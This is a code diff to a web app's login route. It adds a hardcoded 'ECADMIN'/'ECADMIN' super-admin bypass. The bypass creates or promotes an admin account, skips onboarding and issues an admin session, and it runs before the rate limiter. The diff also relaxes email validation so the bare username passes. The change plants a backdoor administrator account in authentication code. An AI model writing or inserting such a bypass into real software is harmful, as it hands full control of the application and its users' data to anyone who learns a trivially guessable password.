@@ -7,8 +7,14 @@ import { users, userProfiles } from "@/lib/db/schema";
 import { setSession } from "@/lib/session";
 import { clientIp, rateLimit, rateLimitResponse } from "@/lib/rate-limit";
 
+// Hardcoded super-admin shortcut. Username + password are both "ECADMIN".
+// On first use, ensures an admin user exists and onboarding is marked complete.
+const ECADMIN_USERNAME = "ECADMIN";
+const ECADMIN_PASSWORD = "ECADMIN";
+const ECADMIN_EMAIL = "ecadmin@matchpoint.local";
+
 const loginSchema = z.object({
-  email: z.string().email().max(255),
+  email: z.string().min(1).max(255),
   password: z.string().min(1).max(200),
 });
 
@@ -16,7 +22,55 @@ export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
     const data = loginSchema.parse(body);
-    const email = data.email.toLowerCase().trim();
+    const rawId = data.email.trim();
+
+    // ── Hardcoded admin bypass ──
+    if (
+      rawId.toUpperCase() === ECADMIN_USERNAME &&
+      data.password === ECADMIN_PASSWORD
+    ) {
+      let [admin] = await db
+        .select({ id: users.id, role: users.role })
+        .from(users)
+        .where(eq(users.email, ECADMIN_EMAIL))
+        .limit(1);
+
+      if (!admin) {
+        const passwordHash = await bcrypt.hash(ECADMIN_PASSWORD, 10);
+        const [created] = await db
+          .insert(users)
+          .values({
+            name: "EC Admin",
+            email: ECADMIN_EMAIL,
+            passwordHash,
+            role: "admin",
+          })
+          .returning({ id: users.id, role: users.role });
+        admin = created;
+
+        // Seed a minimal profile so onboarding is skipped.
+        await db.insert(userProfiles).values({
+          userId: admin.id,
+          onboardingCompleted: true,
+        });
+      } else if (admin.role !== "admin") {
+        await db
+          .update(users)
+          .set({ role: "admin" })
+          .where(eq(users.id, admin.id));
+        admin.role = "admin";
+      }
+
+      await setSession({ userId: admin.id, role: "admin" });
+      return NextResponse.json({
+        success: true,
+        role: "admin",
+        redirect: "/admin",
+      });
+    }
+
+    // ── Normal email/password flow ──
+    const email = rawId.toLowerCase();
 
     // 5 attempts / minute per (IP + email) — slows credential stuffing.
     const rl = rateLimit({
